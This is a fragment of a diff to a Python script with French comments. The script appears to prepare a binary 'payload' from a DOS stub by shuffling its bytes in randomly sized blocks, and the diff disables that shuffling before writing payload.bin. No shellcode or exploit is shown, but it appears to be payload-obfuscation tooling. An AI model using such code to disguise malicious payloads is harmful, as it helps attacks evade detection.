@@ -47,7 +47,7 @@ if __name__ == '__main__':
   
   
   payload = dosstub 
-  
+
   # Choisis une taille de BBOX de 128 a 256 bytes
   bboxlen = random.randrange(128)+128
   print ('* BBox Len: %d' % bboxlen)
@@ -75,13 +75,15 @@ if __name__ == '__main__':
   restrow = payload_len % bboxlen
   
   print ('* Final Process %dx%d bytes row and %d bytes' % (fullrow,bboxlen,restrow)) 
-  
+  """ 
   for BBraw in range(0,fullrow):
     for I in bboxarray:
       opayload.append(payload[(BBraw*bboxlen)+I])
-
+  """
+  opayload = payload
   out = bytearray(opayload)
   
+
   with open('payload.bin',"w") as f:
     f.write(out)
 
